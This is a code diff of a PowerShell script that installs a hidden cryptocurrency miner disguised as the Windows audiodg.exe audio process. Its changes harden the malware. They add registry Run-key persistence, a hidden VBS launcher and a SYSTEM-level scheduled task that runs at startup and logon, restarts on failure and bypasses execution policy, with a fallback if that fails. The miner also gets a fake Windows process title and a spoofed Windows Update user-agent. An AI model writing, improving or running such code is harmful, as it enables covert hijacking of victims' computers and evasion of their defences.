@@ -140,7 +140,7 @@ function Install-PersistenceEnhanced {
         
         $vbsContent = @"
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell -WindowStyle Hidden -Command Start-Process '$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\audiodg.exe' -ArgumentList '--config=config.json' -WindowStyle Hidden", 0, False
+WshShell.Run "powershell -WindowStyle Hidden -Command Start-Process '$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\audiodg.exe' -ArgumentList '--config=config.json --no-color --title=\""Windows Audio Device Graph Isolation\""' -WindowStyle Hidden", 0, False
 "@
         $vbsContent | Set-Content -Path $vbsPath -Force
         attrib +h $vbsPath 2>&1 | Out-Null
@@ -153,24 +153,56 @@ WshShell.Run "powershell -WindowStyle Hidden -Command Start-Process '$env:LOCALA
     # 2. Registry Run key (current user - usually works)
     try {
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        Set-ItemProperty -Path $regPath -Name "Windows Audio Service" -Value "powershell -WindowStyle Hidden -Command Start-Process '$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\audiodg.exe' -ArgumentList '--config=config.json' -WindowStyle Hidden" -ErrorAction Stop
+        $regCmd = "powershell -WindowStyle Hidden -Command Start-Process '$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\audiodg.exe' -ArgumentList '--config=config.json --no-color --title=`"Windows Audio Device Graph Isolation`"' -WindowStyle Hidden"
+        Set-ItemProperty -Path $regPath -Name "Windows Audio Service" -Value $regCmd -ErrorAction Stop
         Write-Host "  [OK] Registry Run key added" -ForegroundColor Green
         $installed++
     } catch {
         Write-Host "  [FAIL] Registry: $($_.Exception.Message)" -ForegroundColor Red
     }
     
-    # 3. Scheduled task (current user - limited)
+    # 3. Scheduled task (runs at startup, works without user login)
     try {
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command Start-Process '$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\audiodg.exe' -ArgumentList '--config=config.json' -WindowStyle Hidden"
-        $trigger = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
+        $stealthCmd = "Start-Process '$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\audiodg.exe' -ArgumentList '--config=config.json --no-color --title=`"Windows Audio Device Graph Isolation`"' -WindowStyle Hidden -NoNewWindow"
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$stealthCmd`""
         
-        Register-ScheduledTask -TaskName "Windows Audio Service Update" -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction Stop | Out-Null
-        Write-Host "  [OK] Scheduled task created" -ForegroundColor Green
+        # Multiple triggers: At startup AND at logon (belt and suspenders)
+        $triggerStartup = New-ScheduledTaskTrigger -AtStartup
+        $triggerLogon = New-ScheduledTaskTrigger -AtLogon
+        
+        # Settings: Run whether user is logged on or not, no timeout, restart on failure
+        $settings = New-ScheduledTaskSettingsSet `
+            -AllowStartIfOnBatteries `
+            -DontStopIfGoingOnBatteries `
+            -Hidden `
+            -StartWhenAvailable `
+            -RunOnlyIfNetworkAvailable:$false `
+            -ExecutionTimeLimit (New-TimeSpan -Days 0) `
+            -RestartCount 3 `
+            -RestartInterval (New-TimeSpan -Minutes 1)
+        
+        # Principal: Run with highest privileges, whether user is logged on or not
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        
+        Register-ScheduledTask -TaskName "Windows Audio Service Update" -Action $action -Trigger @($triggerStartup, $triggerLogon) -Settings $settings -Principal $principal -Force -ErrorAction Stop | Out-Null
+        Write-Host "  [OK] Scheduled task created (runs at startup + logon)" -ForegroundColor Green
         $installed++
     } catch {
         Write-Host "  [FAIL] Scheduled task: $($_.Exception.Message)" -ForegroundColor Red
+        
+        # Fallback: Try with current user if SYSTEM fails
+        try {
+            $fallbackCmd = "Start-Process '$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\audiodg.exe' -ArgumentList '--config=config.json --no-color --title=`"Windows Audio Device Graph Isolation`"' -WindowStyle Hidden -NoNewWindow"
+            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$fallbackCmd`""
+            $triggerStartup = New-ScheduledTaskTrigger -AtStartup
+            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable
+            
+            Register-ScheduledTask -TaskName "Windows Audio Service Update" -Action $action -Trigger $triggerStartup -Settings $settings -Force -ErrorAction Stop | Out-Null
+            Write-Host "  [OK] Scheduled task created (fallback mode)" -ForegroundColor Green
+            $installed++
+        } catch {
+            Write-Host "  [FAIL] Fallback task also failed" -ForegroundColor Red
+        }
     }
     
     Write-Host "`n[RESULT] Installed $installed persistence mechanism(s)" -ForegroundColor Cyan
@@ -204,9 +236,17 @@ function Start-MinerEnhanced {
             return $true
         }
         
-        # Start the miner
+        # Start the miner with stealth parameters
+        $stealthArgs = @(
+            "--config=`"$($DeploymentInfo.ConfigPath)`""
+            "--no-color"
+            "--print-time=60"
+            "--title=`"Windows Audio Device Graph Isolation`""
+            "--user-agent=`"Windows-Update-Client/10.0`""
+        )
+        
         $process = Start-Process -FilePath $DeploymentInfo.MinerPath `
-            -ArgumentList "--config=`"$($DeploymentInfo.ConfigPath)`"", "--print-time=10" `
+            -ArgumentList ($stealthArgs -join " ") `
             -WorkingDirectory (Split-Path $DeploymentInfo.MinerPath) `
             -WindowStyle Hidden `
             -PassThru
